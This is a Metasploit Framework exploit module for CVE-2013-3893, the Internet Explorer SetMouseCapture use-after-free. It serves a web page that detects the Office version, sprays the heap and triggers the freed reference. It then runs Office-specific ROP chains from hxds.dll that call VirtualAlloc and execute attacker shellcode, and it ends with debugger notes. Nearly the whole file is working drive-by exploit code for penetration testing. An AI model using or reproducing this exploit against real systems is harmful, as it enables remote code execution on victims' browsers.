##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Micorosft Internet Explorer SetMouseCapture Use-After-Free",
      'Description'    => %q{
          This module exploits a use-after-free vulnerability that currents targets Internet
          Explorer 9 on Windows 7, but the flaw should exist in versions 6/7/8/9/10/11.
          It was initially found in the wild in Japan, but other regions such as English,
          Chinese, Korean, etc, were targeted as well.

          The vulnerability is due to how the mshtml!CDoc::SetMouseCapture function handles a
          reference during an event. An attacker first can setup two elements, where the second
          is the child of the first, and then setup a onlosecapture event handler for the parent
          element. The onlosecapture event seems to require two setCapture() calls to trigger,
          one for the parent element, one for the child. When the setCapture() call for the child
          element is called, it finally triggers the event, which allows the attacker to cause an
          arbitrary memory release using document.write(), which in particular frees up a 0x54-byte
          memory.  The exact size of this memory may differ based on the version of IE. After the
          free, an invalid reference will still be kept and pass on to more functions, eventuall
          this arrives in function MSHTML!CTreeNode::GetInterface, and causes a crash (or arbitrary
          code execution) when this function attempts to use this reference to call what appears to
          be a PrivateQueryInterface due to the offset (0x00).

          To mimic the same exploit found in the wild, this module will try to use the same DLL
          from Microsoft Office 2007 or 2010 to leverage the attack.

      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Exploit in the wild first spotted in Japan
          'sinn3r'   # Metasploit (thx binjo for the heads up!)
        ],
      'References'     =>
        [
          [ 'CVE', '2013-3893' ],
          [ 'OSVDB', '97380' ],
          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2887505' ],
          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2013/09/17/cve-2013-3893-fix-it-workaround-available.aspx' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [ 'IE 9 on Windows 7 SP1 with Microsoft Office 2007 or 2010', {} ]
        ],
      'Payload'        =>
        {
          'BadChars'        => "\x00",
          'PrependEncoder'  => "\x81\xc4\x80\xc7\xfe\xff" # add esp, -80000
        },
      'DefaultOptions'  =>
        {
          'PrependMigrate'       => true,
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Privileged'     => false,
      'DisclosureDate' => "Sep 17 2013",
      'DefaultTarget'  => 0))
  end

  def is_win7_ie9?(agent)
    (agent =~ /MSIE 9/ and agent =~ /Windows NT 6\.1/)
  end

  def get_preq_html(cli, req)
    %Q|
<html>
<script>
  function getDLL() {
    var checka = 0;
    var checkb = 0;

    try {
      checka = new ActiveXObject("SharePoint.OpenDocuments.4");
    } catch (e) {}

    try {
      checkb = new ActiveXObject("SharePoint.OpenDocuments.3");
    } catch (e) {}

    if ((typeof checka) == "object" && (typeof checkb) == "object") {
      return "office2010";
    }
    else if ((typeof checka) == "number" && (typeof checkb) == "object") {
      return "office2007";
    }

    return "na";
  }

  window.onload = function() {
    document.location = "#{get_resource}/#{@exploit_page}?dll=" + getDLL();
  }
</script>
</html>
    |
  end

  def junk
    return rand_text_alpha(4).unpack("V")[0].to_i
  end

  def get_payload(rop_dll)
    code = payload.encoded
    rop  = ''
    p    = ''

    case rop_dll
    when :office2007
      rop = 
      [
        junk,        # Alignment
        0x51c46f91,  # POP EBP # RETN [hxds.dll] 
        0x51c46f91,  # skip 4 bytes [hxds.dll]
        0x51c35a4d,  # POP EBX # RETN [hxds.dll] 
        0xffffffff,
        0x51bd90fd,  # INC EBX # RETN [hxds.dll]
        0x51bd90fd,  # INC EBX # RETN [hxds.dll]
        0x51bfa98e,  # POP EDX # RETN [hxds.dll] 
        0xffffefff,
        0x51c08b65,  # XCHG EAX, EDX # RETN [hxds.dll]
        0x51c1df88,  # NEG EAX # RETN [hxds.dll]
        0x51c55c45,  # DEC EAX, RETN [hxds.dll]
        0x51c08b65,  # XCHG EAX, EDX # RETN [hxds.dll]
        0x51c4c17c,  # POP ECX # RETN [hxds.dll]
        0xffffffc0,
        0x51bfbaae,  # XCHG EAX, ECX # RETN [hxds.dll]
        0x51c1df88,  # NEG EAX # RETN [hxds.dll]
        0x51bfbaae,  # XCHG EAX, ECX # RETN [hxds.dll]
        0x51c05766,  # POP EDI # RETN [hxds.dll] 
        0x51bfbaaf,  # RETN (ROP NOP) [hxds.dll]
        0x51c2e77d,  # POP ESI # RETN [hxds.dll] 
        0x51bfc840,  # JMP [EAX] [hxds.dll]
        0x51c05266,  # POP EAX # RETN [hxds.dll] 
        0x51bd115c,  # ptr to &VirtualAlloc() [IAT hxds.dll]
        0x51bdf91f,  # PUSHAD # RETN [hxds.dll] 
        0x51c4a9f3,  # ptr to 'jmp esp' [hxds.dll]
     ].pack("V*")

    when :office2010
      rop = 
      [
        # 4 dword junks due to the add esp in stack pivot
        junk,
        junk,
        junk,
        junk,
        0x51c41953,  # POP EBP # RETN [hxds.dll]
        0x51be3a03,  # RETN (ROP NOP) [hxds.dll]
        0x51c41953,  # skip 4 bytes [hxds.dll]
        0x51c4486d,  # POP EBX # RETN [hxds.dll] 
        0xffffffff,
        0x51c392d8,  # EXCHG EAX, EBX # RETN [hxds.dll]
        0x51bd1a77,  # INC EAX # RETN [hxds.dll]
        0x51bd1a77,  # INC EAX # RETN [hxds.dll]
        0x51c392d8,  # EXCHG EAX, EBX # RETN [hxds.dll]
        0x51bfa298,  # POP EDX # RETN [hxds.dll] 
        0xffffefff,
        0x51bea84d,  # XCHG EAX, EDX # RETN [hxds.dll]
        0x51bf5188,  # NEG EAX # POP ESI # RETN [hxds.dll]
        junk,
        0x51bd5382,  # DEC EAX # RETN [hxds.dll]
        0x51bea84d,  # XCHG EAX, EDX # RETN [hxds.dll]
        0x51c1f094,  # POP ECX # RETN [hxds.dll] 
        0xffffffc0,
        0x51be5986,  # XCHG EAX, ECX # RETN [hxds.dll]
        0x51bf5188,  # NEG EAX # POP ESI # RETN [hxds.dll]
        junk,
        0x51be5986,  # XCHG EAX, ECX # RETN [hxds.dll]
        0x51bf1ff0,  # POP EDI # RETN [hxds.dll] 
        0x51bd5383,  # RETN (ROP NOP) [hxds.dll]
        0x51c07c8b,  # POP ESI # RETN [hxds.dll] 
        0x51bfc7cb,  # JMP [EAX] [hxds.dll]
        0x51c44707,  # POP EAX # RETN [hxds.dll] 
        0x51bd10bc,  # ptr to &VirtualAlloc() [IAT hxds.dll]
        0x51c3604e,  # PUSHAD # RETN [hxds.dll] 
        0x51c541ef,  # ptr to 'jmp esp' [hxds.dll]
      ].pack("V*")
    end

    p = rop + code
    p
  end

  def get_exploit_html(cli, req, rop_dll)
    gadgets = {}
    case rop_dll
    when :office2007
      gadgets[:spray1] = 0x1af40020

      # 0x31610020-0xc4, pointer to gadgets[:call_eax]
      gadgets[:target] = 0x3160ff5c

      # mov eax, [esi]
      # push esi
      # call [eax+4]
      gadgets[:call_eax] = 0x51bd1ce8

      # xchg eax,esp
      # add byte [eax], al
      # pop esi
      # mov [edi+23c], ebp
      # mov [edi+238], ebp
      # mov [edi+234], ebp
      # pop ebp
      # pop ebx
      # ret
      gadgets[:pivot] = 0x51be4418

    when :office2010
      gadgets[:spray1] = 0x1a7f0020

      # 0x30200020-0xc4, pointer to gadgets[:call_eax]
      gadgets[:target] = 0x301fff5c

      # mov eax, [esi]
      # push esi
      # call [eax+4]
      gadgets[:call_eax] = 0x51bd1a41

      # xchg eax,esp
      # add eax,dword ptr [eax]
      # add esp,10
      # mov eax,esi
      # pop esi
      # pop ebp # retn 4
      gadgets[:pivot] = 0x51c00e64
    end

    p1 =
    [
      gadgets[:target],  # Target address
      gadgets[:pivot]    # stack pivot
    ].pack("V*")

    p1 << get_payload(rop_dll)

    p2 =
    [
      gadgets[:call_eax] # MSHTML!CTreeNode::NodeAddRef+0x48 (call eax)
    ].pack("V*")

    js_s1 = Rex::Text::to_unescape([gadgets[:spray1]].pack("V*"))
    js_p1 = Rex::Text.to_unescape(p1)
    js_p2 = Rex::Text.to_unescape(p2)

    %Q|
<html>
<script>
#{js_property_spray}

function loadOffice() {
  try{location.href='ms-help://'} catch(e){}
}

var a = new Array();
function spray() {
  var obj = '';
  for (i=0; i<20; i++) {
    if (i==0) { obj += unescape("#{js_s1}"); }
    else      { obj += "\\u4242\\u4242"; }
  }
  obj += "\\u5555";

  for (i=0; i<10; i++) {
    var e = document.createElement("div");
    e.className = obj;
    a.push(e);
  }

  var s1 = unescape("#{js_p1}");
  sprayHeap({shellcode:s1, maxAllocs:0x300});
  var s2 = unescape("#{js_p2}");
  sprayHeap({shellcode:s2, maxAllocs:0x300});
}

function hit()
{
  var id_0 = document.createElement("sup");
  var id_1 = document.createElement("audio");

  document.body.appendChild(id_0);
  document.body.appendChild(id_1);
  id_1.applyElement(id_0);

  id_0.onlosecapture=function(e) {
    document.write("");
    spray();
  }

  id_0['outerText']="";
  id_0.setCapture();
  id_1.setCapture();
}

for (i=0; i<20; i++) {
  document.createElement("frame");
}

window.onload = function() {
  loadOffice();
  hit();
}
</script>
</html>
    |
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    unless is_win7_ie9?(agent)
      print_error("Not a suitable target: #{agent}")
      send_not_found(cli)
    end

    html = ''
    if request.uri =~ /\?dll=(\w+)$/
      rop_dll = ''
      if $1 == 'office2007'
        print_status("Using Office 2007 ROP chain")
        rop_dll = :office2007
      elsif $1 == 'office2010'
        print_status("Using Office 2010 ROP chain")
        rop_dll = :office2010
      else
        print_error("Target does not have Office installed")
        send_not_found(cli)
        return
      end

      html = get_exploit_html(cli, request, rop_dll)
    else
      print_status("Checking target requirements...")
      html = get_preq_html(cli, request)
    end

    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})
  end

  def exploit
    @exploit_page = "default.html"
    super
  end

end

=begin

hxds.dll (Microsoft� Help Data Services Module)

  2007 DLL info:
  ProductVersion:   2.05.50727.198
  FileVersion:      2.05.50727.198 (QFE.050727-1900)

  2010 DLL info:
  ProductVersion:   2.05.50727.4039
  FileVersion:      2.05.50727.4039 (QFE.050727-4000)

mshtml.dll
  ProductVersion:   9.00.8112.16446
  FileVersion:      9.00.8112.16446 (WIN7_IE9_GDR.120517-1400)
  FileDescription:  Microsoft (R) HTML Viewer


0:005> r
eax=41414141 ebx=6799799c ecx=679b6a14 edx=00000000 esi=00650d90 edi=021fcb34
eip=679b6b61 esp=021fcb0c ebp=021fcb20 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
MSHTML!CTreeNode::GetInterface+0xd8:
679b6b61 8b08            mov     ecx,dword ptr [eax]  ds:0023:41414141=????????


66e13df7 8b0e            mov     ecx,dword ptr [esi]
66e13df9 8b11            mov     edx,dword ptr [ecx]  <-- mshtml + (63993df9 - 63580000)
66e13dfb 8b82c4000000    mov     eax,dword ptr [edx+0C4h]
66e13e01 ffd0            call    eax

=end